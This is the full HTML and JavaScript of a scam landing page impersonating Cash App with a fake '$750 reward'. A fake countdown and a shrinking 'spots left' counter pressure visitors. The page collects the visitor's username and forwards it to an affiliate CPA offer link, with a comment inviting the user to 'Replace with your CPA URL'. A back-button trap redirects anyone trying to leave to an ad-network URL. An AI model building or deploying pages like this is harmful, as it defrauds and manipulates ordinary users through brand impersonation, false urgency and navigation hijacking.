<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Claim Your $750 Cash App Reward!</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
    }
    body {
      background-color: #00d54b;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      position: relative;
    }
    .logo {
      position: absolute;
      top: 20px;
      left: 20px;
      width: 100px;
    }
    .container {
      background: #fff;
      color: #000;
      border-radius: 16px;
      padding: 40px 30px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
      text-align: center;
      max-width: 400px;
      width: 100%;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    button {
      background-color: #00d54b;
      border: none;
      color: white;
      padding: 14px;
      width: 100%;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }
    .countdown {
      margin-top: 20px;
      font-weight: bold;
      color: red;
    }
    .remaining {
      font-size: 14px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <img src="https://i.imgur.com/TYWI1g9_d.png?maxwidth=520&shape=thumb&fidelity=high" class="logo" alt="Cash App Logo">
  <div class="container">
    <h1>Claim Your $750 Cash App Reward!</h1>
    <p>Enter your  username to continue</p>
    <input type="text" id="username" placeholder="Username" />
    <button onclick="submitForm()">Submit</button>
    <div class="countdown" id="timer"></div>
    <div class="remaining" id="remaining">Spots left: <span id="spots">18</span></div>
  </div>

  <script>
    let seconds = 3080;
    const timerElement = document.getElementById("timer");
    const spotsElement = document.getElementById("spots");
    const offerURL = "https://smrturl.co/a/s5fca8ce62e/663?s1="; // Replace with your CPA URL
    const redirectURL = "https://www.profitableratecpm.com/ixfx8x5x?key=9714522be24485cc734736bcc3683eb2";

    function updateTimer() {
      const minutes = Math.floor(seconds / 60);
      const secs = seconds % 60;
      timerElement.textContent = `Offer expires in ${minutes}:${secs < 10 ? "0" : ""}${secs}`;
      if (seconds > 0) {
        seconds--;
        if (seconds % 20 === 0 && Number(spotsElement.textContent) > 1) {
          spotsElement.textContent = Number(spotsElement.textContent) - 1;
        }
      } else {
        clearInterval(timer);
      }
    }
    const timer = setInterval(updateTimer, 1000);

    function submitForm() {
      const username = document.getElementById("username").value.trim();
      if (username.length < 3) {
        alert("Please enter a valid Cash App username.");
        return;
      }
      window.location.href = offerURL + '?user=' + encodeURIComponent(username);
    }

    // Prevent back navigation
    history.pushState(null, document.title, location.href);
    window.addEventListener('popstate', function () {
      location.href = redirectURL;
    });
  </script>
</body>
</html>
